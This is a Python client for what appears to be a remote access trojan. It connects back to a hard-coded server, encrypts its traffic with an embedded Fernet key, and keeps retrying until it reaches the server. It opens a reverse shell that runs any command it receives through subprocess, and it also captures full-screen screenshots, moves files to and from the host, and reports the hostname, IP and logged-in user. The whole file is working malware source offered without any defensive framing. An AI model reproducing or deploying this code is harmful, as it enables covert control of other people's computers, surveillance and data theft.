import socket
import sys
import os
import time
import subprocess
from cryptography.fernet import Fernet
import mss



address = ("0.0.0.0", 3001)
f_key = b'FhnnERujmRY65fVqM0S_LvK26NybEETUlK0_gvV9Dws=' # Insert key from Fernet.generate_key(), must be same as Server


def take_screen_shot():
    if mss.mss().monitors:
        raw_pixels = mss.mss().grab(mss.mss().monitors[0])
        img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
        send(img_data)

    else:
        send(b'')

def get_info():
    description = f"""Client Name: {os.uname().nodename}\nLocal IP: {socket.gethostbyname(os.uname().nodename)}\nUser: {os.getlogin()}\nPassword: {"🤷🏻‍♂️ (Dunno know)"}"""
    send(description.encode())

def recv(buff_size=1024, show_status=False):
    data_buff = bytes()

    try:
        data_size = server_con.recv(12)
        data_size = int(data_size.decode().rstrip())

        if not data_size:
            return None

        while len(data_buff) < data_size:
            if show_status:
                print(f"{len(data_buff/8)}/{data_size/8}KB")

            data_buff += server_con.recv(buff_size)

        

    except:
        print("Unable to retrieve data.")
        
    return lock.decrypt(data_buff)


def send(data):
    header_size = 12
    encrypted_data = lock.encrypt(data)
    data_size = f"{len(encrypted_data):<{header_size}}"
    server_con.sendall(data_size.encode()+encrypted_data)


def upload_file(file_name):
    try:
        with open(file_name, "rb") as file:
            file_data = file.read()
            send(file_data)

    except:
        print("Error opening file")
        send(b'')

def download_file(file_name, file_path):
    file_data = recv(buff_size=16384, show_status=True)
    if not file_data:
        print("Could not download file...")
        return

    try:
        file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
        file.write(file_data)
        file.close()

    except OSError as e:
        print(e)

def open_shell():
    while True:
        print("waiting for cmd...")
        cmd = recv()
        str_msg = b""

        if not cmd:
            continue

        cmd = cmd.decode()

        if cmd == "exit":
            break

        elif cmd[:2] == "cd":
            dir = cmd[3:]
            try:
                os.chdir(dir)
            except FileNotFoundError as e:
                str_msg = str(e).encode()
            else:
                str_msg = os.getcwd().encode() + b"\n"

        elif cmd[:2] == "dw":
            file_name = cmd[3:]
            print(f"Uploading File...{file_name}")
            upload_file(file_name)
            continue

        elif cmd[:2] == "up":
            file_name = cmd[3:]
            print(f"Downloading File...{file_name}")
            download_file(file_name=file_name, file_path=os.getcwd())
            continue

        else:
            output = subprocess.Popen(f'{cmd}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            str_msg = output[0] + output[1] 



        send(str_msg)




def establish_connection(address):
    global server_con, lock
    lock = Fernet(f_key)

    print("Connecting...")
    while True:
        try:
            server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_con.connect((address[0],address[1]))
            print(f"Connected!\nServer: {address[0]}:{address[1]}")

            send(f_key)
            is_OK = recv().decode()
            if is_OK == "OK":
                break

        except:
            time.sleep(3)
        else:
            break

def kill_connection():
    server_con.shutdown(socket.SHUT_WR)
    server_con.close()

def main():
    establish_connection(address)
    while True:
        choice = recv().decode()
        if choice == "1":
            print("Opening Shell...")
            open_shell()
        elif choice == "2":
            take_screen_shot()
        elif choice == "3":
            pass

        elif choice == "4":
            get_info()

        elif choice == "5":
            keep_alive = recv().decode().lower()
            if keep_alive == "y" or keep_alive == "yes":
                server_con.shutdown(socket.SHUT_WR)
                server_con.close()
                time.sleep(5)
                establish_connection(address)
            else:
                break


    kill_connection()

main()
